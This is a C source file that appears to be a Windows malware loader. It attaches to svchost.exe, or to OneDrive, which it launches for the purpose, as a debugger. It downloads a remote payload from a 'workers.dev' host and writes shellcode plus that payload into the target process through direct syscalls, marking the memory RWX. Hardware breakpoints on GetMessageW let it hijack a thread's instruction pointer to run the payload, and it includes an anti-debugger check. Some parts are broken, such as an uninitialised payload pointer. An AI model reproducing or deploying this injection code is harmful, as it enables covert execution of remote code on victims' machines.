//
#include "Structs.h"
#include "Common.h"
#include <tlhelp32.h>
#include "Debug.h"

#include <stdio.h>
#include <Windows.h>



extern NT_API g_NtXX;

unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartBitPosition, int NumberOfBitToModify, unsigned long long NewbitValue) {
	unsigned long long mask = (1UL << NumberOfBitToModify) - 1UL;
	unsigned long long NewDr7Register = (CurrentDr7Register & ~(mask << StartBitPosition)) | (NewbitValue << StartBitPosition);

	return NewDr7Register;

}



BOOL HardwareHookSingleThread(IN DWORD dwThreadID, IN ULONG_PTR uTargetFuncAddress) {


	CONTEXT ThreadContext = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	HANDLE  hThread = NULL;
	BOOL    bResult = FALSE;


	if (!dwThreadID || !uTargetFuncAddress)
		return FALSE;

	if (!(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID))) {
		////PRINT("[!] OpenThread Failed with Error :%d \n", GetLastError());
		goto END;
	}

	if (!GetThreadContext(hThread, &ThreadContext)) {
		////PRINT("[!] GetThreadContext Failed with Error :%d \n", GetLastError());
		goto END;
	}

	ThreadContext.Dr0 = uTargetFuncAddress;
	ThreadContext.Dr7 = SetDr7Bits(ThreadContext.Dr7, 0x00, 0x01, 0x01);

	if (!SetThreadContext(hThread, &ThreadContext)) {
		////PRINT("[!] SetThreadContext Failed with Error :%d \n", GetLastError());
		goto END;
	}

	bResult = TRUE;


END:
	if (hThread)
		CloseHandle(hThread);
	return bResult;
}




BOOL HardwareUnhookSingleThread(IN DWORD dwThreadID) {

	CONTEXT ThreadContext = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	HANDLE  hThread = NULL;
	BOOL    bResult = FALSE;


	if (!dwThreadID)
		return FALSE;

	if (!(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID))) {
		////PRINT("[!] OpenThread Failed with Error :%d \n", GetLastError());
		goto END;
	}

	if (!GetThreadContext(hThread, &ThreadContext)) {
		////PRINT("[!] GetThreadContext Failed with Error :%d \n", GetLastError());
		goto END;
	}

	ThreadContext.Dr0 = 0x00;
	ThreadContext.Dr7 = SetDr7Bits(ThreadContext.Dr7, 0x00, 0x01, 0x00);

	if (!SetThreadContext(hThread, &ThreadContext)) {
		////PRINT("[!] SetThreadContext Failed with Error :%d \n", GetLastError());
		goto END;
	}

	bResult = TRUE;


END:
	if (hThread)
		CloseHandle(hThread);
	return bResult;


}


BOOL HardwareHookOrUnhookProcess(IN DWORD dwTargetProcessId, IN OPTIONAL ULONG_PTR uTargetFuncAddress, IN BOOL bInstallHardwareHook) {

	BOOL			bResult = FALSE,
					bFound = FALSE;

	THREADENTRY32	ThreadEntry = { .dwSize = sizeof(THREADENTRY32) };
	HANDLE			hSnapShot = INVALID_HANDLE_VALUE;

	if ((bInstallHardwareHook && !uTargetFuncAddress) || !dwTargetProcessId)
		return FALSE;

	if ((hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL)) == INVALID_HANDLE_VALUE) {
		//PRINT("[!] CreateToolhelp32Snapshot  failed with error :%d \n", GetLastError());
		return FALSE;

	}

	if (!Thread32First(hSnapShot, &ThreadEntry)) {
		//PRINT("[!] Thread32Firstfailed with error :%d \n", GetLastError());
		goto END;

	}


	if (bInstallHardwareHook)
		//PRINT("[!] Installing HWBP on target process threads ..\n");
	/*else
		//PRINT("[!] Removing HWBP on target process threads ..\n");*/

	do {
		if (ThreadEntry.th32OwnerProcessID == dwTargetProcessId) {

			bFound = TRUE;

			if (bInstallHardwareHook) {
#ifdef DEBUG
				PRINT("\t<i> Installing A BreakPoint At thread of ID: %d...", ThreadEntry.th32ThreadID);
#endif
				if (!HardwareHookSingleThread(ThreadEntry.th32ThreadID, uTargetFuncAddress)) {
					//PRINT("[-] FAILED \n");
					continue;
				}
#ifdef DEBUG

				PRINT("[+] SUCCEEDED \n");
#endif

				bResult = TRUE;

			}

			if (!bInstallHardwareHook) {
				//PRINT("\t<i> Removing A breakpoint thread of ID: %d...", ThreadEntry.th32ThreadID);
				if (!HardwareUnhookSingleThread(ThreadEntry.th32ThreadID)) {
					//PRINT("[-] FAILED \n");
					continue;
				}
#ifdef DEBUG

				PRINT("[+] SUCCEEDED \n");
#endif

				bResult = TRUE;
			}
		}

	} while (Thread32Next(hSnapShot, &ThreadEntry));



END:
	if (!bFound)
		////PRINT("[!] Could not Find process of PID equal To %d\n", dwTargetProcessId);
	if (hSnapShot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapShot);
	return bResult;

}



BOOL FindMemoryHole(IN HANDLE hProcess, OUT ULONG_PTR* puAddress, IN ULONG_PTR uExportedFuncAddress, IN SIZE_T sTotalPayloadSize) {

	NTSTATUS	STATUS = STATUS_SUCCESS;
	ULONG_PTR	uAddress = NULL;
	SIZE_T		sTmpSizeVar = sTotalPayloadSize;

	for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000; uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000) {
		SET_SYSCALL(g_NtXX.NtAllocateVirtualMemory);
		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &uAddress, 0x00, &sTmpSizeVar, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))))

			continue;

		// Allocated an address, break
		*puAddress = uAddress;
		break;
	}


	return *puAddress ? TRUE : FALSE;
}

BOOL WritePayloadBuffer(IN HANDLE hProcess, IN ULONG_PTR uAddress, IN ULONG_PTR uHookShellcode, IN SIZE_T sHookShellcodeSize, IN ULONG_PTR uMainPayloadBuffer, IN SIZE_T sMainPayloadSize) {

	SIZE_T	 sTmpSizeVar = sHookShellcodeSize + sMainPayloadSize,
			sBytesWritten = 0x00;
	DWORD	 dwOldProtection = 0x00;
	NTSTATUS STATUS = STATUS_SUCCESS;


	if (!hProcess || !uAddress || !uHookShellcode || !uMainPayloadBuffer || !sHookShellcodeSize || !sMainPayloadSize)
		return FALSE;

	SET_SYSCALL(g_NtXX.NtWriteVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, uAddress, uHookShellcode, sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) {

		
		return FALSE;

	}

	//write main
	SET_SYSCALL(g_NtXX.NtWriteVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, (uAddress + sBytesWritten), uMainPayloadBuffer, sMainPayloadSize, &sBytesWritten))) || sBytesWritten != sMainPayloadSize) {

	

		return FALSE;
	}
	//RWX


	SET_SYSCALL(g_NtXX.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = (RunSyscall(hProcess, &uAddress, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection))))) {

		return FALSE;
	}

	return TRUE;

}

BOOL HijackTargetThread(IN DWORD dwThreadID, IN ULONG_PTR uAddressToExcute) {

	CONTEXT ThreadContext = { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };
	HANDLE  hThread = NULL;
	BOOL    bResult = FALSE;



	if (!dwThreadID || !uAddressToExcute)
		return FALSE;

	if (!(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID))) {

		////PRINT("[!] OpenThread failed with error %d\n", GetLastError());
		return FALSE;
		goto END;
	}

	if (!GetThreadContext(hThread, &ThreadContext)) {
		////PRINT("[!] GetThreadContext Failed with Error :%d \n", GetLastError());
		goto END;
	}

	ThreadContext.Rip = uAddressToExcute;

	if (!SetThreadContext(hThread, &ThreadContext)) {
		////PRINT("[!] SetThreadContext Failed with Error :%d \n", GetLastError());
		goto END;
	}

	bResult = TRUE;



END:
	if (hThread)
		CloseHandle(hThread);
	return bResult;

}


BOOL GetProcessIDViaSnapShot(IN LPWSTR szProcessName, OUT PDWORD pdwProcessID, OUT OPTIONAL PHANDLE phProcess) {

	PROCESSENTRY32 ProcEntry = { .dwSize = sizeof(PROCESSENTRY32) };
	WCHAR		   wcUpperCaseProcName[MAX_PATH] = { 0x00 };
	HANDLE		   hSnapShot = INVALID_HANDLE_VALUE;

	if (!szProcessName || !pdwProcessID || lstrlenW(szProcessName) >= MAX_PATH)
		return FALSE;

	for (int i = 0; i < lstrlenW(szProcessName); i++) {
		if (szProcessName[i] >= 'a' && szProcessName[i] <= 'z')
			wcUpperCaseProcName[i] = szProcessName[i] - 'a' + 'A';
		else
			wcUpperCaseProcName[i] = szProcessName[i];

	}

	if ((hSnapShot = CreateToolhelp32Snapshot
	(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		////PRINT("[!] CreateToolhelp32Snapshot failed with error : %d\n", GetLastError());
		return FALSE;
	}

	if (!Process32First(hSnapShot, &ProcEntry)) {
		////PRINT("[!] Process32First failed with error : %d\n", GetLastError());
		goto _END;
	}

	do {
		WCHAR szUprProcName[MAX_PATH] = { 0x00 };

		if (ProcEntry.szExeFile && lstrlenW(ProcEntry.szExeFile) < MAX_PATH) {

			RtlSecureZeroMemory(szUprProcName, sizeof(szUprProcName));

			for (int i = 0; i < lstrlenW(ProcEntry.szExeFile); i++) {

				if (ProcEntry.szExeFile[i] >= 'a' && ProcEntry.szExeFile[i] <= 'z')
					szUprProcName[i] = ProcEntry.szExeFile[i] - 'a' + 'A';
				else
					szUprProcName[i] = ProcEntry.szExeFile[i];
			}
		}

		if (wcscmp(szUprProcName, wcUpperCaseProcName) == 0x00) {
			if (phProcess)
				*phProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcEntry.th32ProcessID);
			*pdwProcessID = ProcEntry.th32ProcessID;

			break;
		}

	} while (Process32Next(hSnapShot, &ProcEntry));
_END:
	if (hSnapShot != INVALID_HANDLE_VALUE)
		CloseHandle(hSnapShot);
	return (*pdwProcessID) ? TRUE : FALSE;


}



unsigned char g_HookShellcode[42] = {
		0x5B, 0x48, 0x83, 0xEB, 0x05, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41, 0x50,
		0x41, 0x53, 0x41, 0x52, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00,
		0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41,
		0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};


#define PAYLOAD L"workers.dev"
#define FILENAME L""

#define TARGET_FUNC			    GetMessageW

BOOL FetchAesConfAndDecrypt(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* sPayloadSize, OUT PBYTE* ppDecryptedPayload);

BOOL HandleHookingThreadFunction(IN OUT PTHREAD_PARMS pThreadParm) {

	PBYTE		pDecryptedPayload = NULL;


	WaitForSingleObject(pThreadParm->hProcess, 3 * 1000);



	if (!(FetchPayload(PAYLOAD, FILENAME, &pThreadParm->PayloadBuffer, &pThreadParm->PayloadSize)))
		return FALSE;


	if (!FindMemoryHole(pThreadParm->hProcess, &pThreadParm->uMemoryHole, pThreadParm->uTargetFuncAddress, pThreadParm->PayloadSize + sizeof(g_HookShellcode)))
		//////PRINT("FindMemoryHole FIALED\n");
		return FALSE;



	if (!WritePayloadBuffer(pThreadParm->hProcess, pThreadParm->uMemoryHole, g_HookShellcode, sizeof(g_HookShellcode), pDecryptedPayload, pThreadParm->PayloadSize)))
		////PRINT("WritePayloadBuffer FIALED \n");
		return FALSE;

	if (!HardwareHookOrUnhookProcess(pThreadParm->dwProcessId, pThreadParm->uTargetFuncAddress, TRUE)) {
		//PRINT("[!] HardwareHookOrUnhookProcess [1] FAILED \n");
		return FALSE;
	}

	return TRUE;



}


#define GET_FILENAMEW(PATH)		(wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))

#define TARGET_PROCESS_NAME				L"svchost.exe"
//#define TARGET_PROCESS_NAME				L"OneDrive.exe"
//#define TARGET_PROCESS_NAME				L"Teams.exe"



#include <lm.h>
#include <stdio.h>

#pragma comment(lib, "netapi32.lib")


int CreateOneDriveProcess(const WCHAR* basePath) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	// Initialize the STARTUPINFOW structure
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	// Initialize the PROCESS_INFORMATION structure
	ZeroMemory(&pi, sizeof(pi));

	// Create the process
	if (CreateProcessW(
		basePath,   // Application name
		NULL,       // Command line arguments
		NULL,       // Process handle not inheritable
		NULL,       // Thread handle not inheritable
		FALSE,      // Set handle inheritance to FALSE
		0,          // No creation flags
		NULL,       // Use parent's environment block
		NULL,       // Use parent's starting directory
		&si,        // Pointer to STARTUPINFOW structure
		&pi         // Pointer to PROCESS_INFORMATION structure
	)) {
		// Successfully created the process

		// Wait until the process exits
		WaitForSingleObject(pi.hProcess, 20000);

		// Close process and thread handles
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return 0;
	}

	return 1;
}

int EnumerateAndCreateOneDrive() {
	USER_INFO_0* pBuf = NULL;
	USER_INFO_0* pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	NET_API_STATUS nStatus;

	const WCHAR* basePaths[] = {
		L"C:\\Users\\%s\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
		L"C:\\Program Files (x86)\\Microsoft OneDrive\\OneDrive.exe",
		L"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe"
	};

	WCHAR currentUserPath[MAX_PATH];
	WCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	// Get the current username
	if (GetUserNameW(username, &username_len)) {
		if (swprintf(currentUserPath, MAX_PATH, basePaths[0], username) != -1) {
			// Try to create the OneDrive process for the current user
			if (CreateOneDriveProcess(currentUserPath) == 0) {
				return 0;
			}
		}
	}

	// Call the NetUserEnum function to enumerate user accounts
	nStatus = NetUserEnum(
		NULL,
		dwLevel,
		FILTER_NORMAL_ACCOUNT, // global users
		(LPBYTE*)&pBuf,
		dwPrefMaxLen,
		&dwEntriesRead,
		&dwTotalEntries,
		&dwResumeHandle
	);

	if (nStatus == NERR_Success) {
		if ((pTmpBuf = pBuf) != NULL) {
			for (i = 0; i < dwEntriesRead; i++) {
				if (pTmpBuf == NULL) {
					break;
				}
				wprintf(L"Username: %s\n", pTmpBuf->usri0_name);

				// Try to create the OneDrive process for other paths
				for (int j = 1; j < sizeof(basePaths) / sizeof(basePaths[0]); ++j) {
					if (CreateOneDriveProcess(basePaths[j]) == 0) {
						NetApiBufferFree(pBuf);
						return 0;
					}
				}
				pTmpBuf++;
			}
		}
	}

	if (pBuf != NULL) {
		NetApiBufferFree(pBuf);
	}

	return 1;
}



int HWBP() {

	DEBUG_EVENT				DebugEvent = { 0 };
	THREAD_PARMS			ThreadParms = { 0 };
	HANDLE					hThread = NULL,
							hProcess = NULL;
	DWORD					dwProcessId = 0x00;

	check_debuuger();



	if (!GetProcessIDViaSnapShot(TARGET_PROCESS_NAME, &dwProcessId, &hProcess)) {

		EnumerateAndCreateOneDrive();
		GetProcessIDViaSnapShot(TARGET_PROCESS_NAME, &dwProcessId, &hProcess);
		////PRINT("[!] Coundn't find the \%ws\" Process Running \n", TARGET_PROCESS_NAME);
		//return -1;

	}

	
	if (!DebugActiveProcess(dwProcessId)) {
		////PRINT("[!] DebugActiveProcess failed with error: %d \n", GetLastError());
		return -1;
	}
	////PRINT("[+] DONE Initialize The Syscall Struct \n");

	ThreadParms.hProcess = hProcess;
	ThreadParms.dwProcessId = dwProcessId;
	ThreadParms.uTargetFuncAddress = TARGET_FUNC;



	if (!(hThread = CreateThread(NULL, 0x00, (LPTHREAD_START_ROUTINE)HandleHookingThreadFunction, &ThreadParms, 0x00, NULL))) {
		////PRINT("[!] CreateThread Failed With Error: %d \n", GetLastError());
		return -1;
	}

	PRINT("[i] Parsing Debug Events ... \n");

	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {

		case EXCEPTION_DEBUG_EVENT: {

			if (DebugEvent.u.Exception.ExceptionRecord.ExceptionCode == STATUS_SINGLE_STEP) {
				PRINT("[i] Hardware BreakPoint Hit At: 0x%p\n", DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress);

				if (DebugEvent.u.Exception.ExceptionRecord.ExceptionAddress == TARGET_FUNC) {
					PRINT("[*] Target Function Hit\n");

					if (HijackTargetThread(DebugEvent.dwThreadId, ThreadParms.uMemoryHole)) {

						PRINT("[*] Thread %d Hijacked !\n", DebugEvent.dwThreadId);

						// Remove Hardware BreakPoints From All Threads
						HardwareHookOrUnhookProcess(dwProcessId, NULL, FALSE);

						// Mark event as handled so that the thread can be resumed (and thus hijacked) 
						ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);

						// Exit
						goto _END;
					}
					
				}
			}

			break;
		};

		case EXIT_PROCESS_DEBUG_EVENT:
			//PRINT("[i] Remote Process Terminated \n");
			return 0;

		default:
			break;
		}

		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}
_END:
	if (!DebugActiveProcessStop(DebugEvent.dwProcessId)) {
		////PRINT("[!] DebugActiveProcessProcessStop failed with error :%d\n", GetLastError());
		return -1;
	}

	CloseHandle(hProcess);
	CloseHandle(hThread);


	return 0;
}
